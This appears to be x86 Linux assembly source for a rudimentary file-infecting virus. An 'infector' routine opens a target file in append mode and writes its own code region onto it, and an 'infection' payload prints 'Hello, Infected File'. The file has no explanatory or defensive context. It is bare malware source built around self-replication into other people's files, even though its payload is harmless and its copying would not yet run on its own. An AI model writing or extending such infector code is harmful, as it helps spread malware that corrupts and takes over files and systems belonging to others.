section .rodata
    inf_msg: db "Hello, Infected File", 10, 0

section .text
global infection
global infector
global code_start
global code_end

code_start:
infection:
    pushad
    mov eax, 4              ; SYS_WRITE
    mov ebx, 1              ; STDOUT
    mov ecx, inf_msg
    mov edx, 22
    int 0x80
    popad
    ret

infector:
    push ebp
    mov ebp, esp
    pushad
    ; Open file for appending
    mov eax, 5              ; SYS_OPEN
    mov ebx, [ebp+8]        ; filename
    mov ecx, 1025           ; O_WRONLY | O_APPEND
    int 0x80
    mov ebx, eax            ; file descriptor

    ; Write code between code_start and code_end
    mov eax, 4
    mov ecx, code_start
    mov edx, code_end
    sub edx, code_start
    int 0x80

    ; Close file
    mov eax, 6              ; SYS_CLOSE
    int 0x80
    popad
    pop ebp
    ret
code_end: